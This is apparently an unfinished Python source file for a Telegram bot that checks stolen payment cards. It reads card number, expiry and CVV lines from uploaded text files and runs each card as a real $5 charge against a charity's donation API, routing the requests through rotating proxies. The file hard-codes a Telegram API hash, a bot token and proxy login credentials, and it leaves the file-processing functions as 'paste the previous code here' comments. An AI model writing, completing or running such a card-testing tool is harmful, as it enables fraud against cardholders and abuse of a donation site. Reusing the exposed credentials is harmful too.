from telethon import TelegramClient, events, Button
import re, asyncio, os, random, aiohttp, aiofiles
from datetime import datetime

API_ID = 37235723
API_HASH = "880a876edaf529c8493b873d47821ec2"
BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"

PROXIES = [
    "dc.oxylabs.io:8000:harshop01_6Mzjy:V=DMlz+qMinV_n85",
    "px490402.pointtoserver.com:10780:purevpn0s8732217:i67s60ep"
]

client = TelegramClient('bot', API_ID, API_HASH)
active_tasks = {}

async def charge_5_dollars(card: str):
    cc, mm, yy, cvv = card.split('|')
    if len(yy) == 2:
        yy = "20" + yy

    current_time = datetime.now().strftime('%H:%M:%S')
    print(f"[{current_time}] [CC CHECKING] {cc} | MM/YY {mm}/{yy} | CVV {cvv}")

    try:
        proxy = random.choice(PROXIES)
        user = proxy.split(':')[2]
        host = proxy.split(':')[0]
        port = proxy.split(':')[1]
        proxy_url = f"http://{user}:{proxy.split(':')[3]}@{host}:{port}"

        print(f"[{current_time}] [PROXY USING] {host}:{port} | User: {user}")

        payload = {
            "amount": "5",
            "currency": "USD",
            "card": {"number": cc, "exp_month": int(mm), "exp_year": int(yy), "cvc": cvv},
            "designation": "General designation"
        }

        async with aiohttp.ClientSession() as session:
            async with session.post(
                "https://weanimals.donorsupport.co/api/donate",
                json=payload,
                proxy=proxy_url,
                timeout=25
            ) as r:
                text = await r.text()
                print(f"[{current_time}] [SITE RESPONSE] Status: {r.status} | Length: {len(text)} | Body: {text[:250]}")

                if r.status in (200, 201) and any(word in text.lower() for word in ["success", "approved", "charged"]):
                    print(f"[{current_time}] [SUCCESS] CHARGED $5 → {cc}")
                    return {"status": "CHARGED", "response": "💎 CHARGED $5"}
                else:
                    print(f"[{current_time}] [DECLINED] {cc}")
                    return {"status": "DECLINED", "response": "❌ Declined"}

    except Exception as e:
        print(f"[{current_time}] [PROXY/SITE ERROR] {type(e).__name__}: {e}")
        return {"status": "ERROR", "response": "Proxy or connection failed"}


def mask_card(card):
    cc = card.split('|')[0]
    return cc[:6] + "******" + cc[-4:]


@client.on(events.NewMessage())
async def handler(event):
    sender = await event.get_sender()
    print(f"\n[{datetime.now().strftime('%H:%M:%S')}] [NEW FILE] Sender: {sender.first_name} (@{sender.username or 'N/A'}) ID: {sender.id}")
    if event.document and str(event.file.name).lower().endswith('.txt'):
        await process_txt(event)


async def process_txt(event):
    await event.reply("📂 Processing TXT file...")
    # ... (same as before, omitted for brevity)

    # Keep the rest same as previous real $5 version
    # (process_txt, mass_check, stop_callback, main - copy from last version)

# Paste the full previous $5 code here and replace the check function with the new one above.

async def main():
    print("🚀 Advanced Logging + Real $5 Charge Started")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
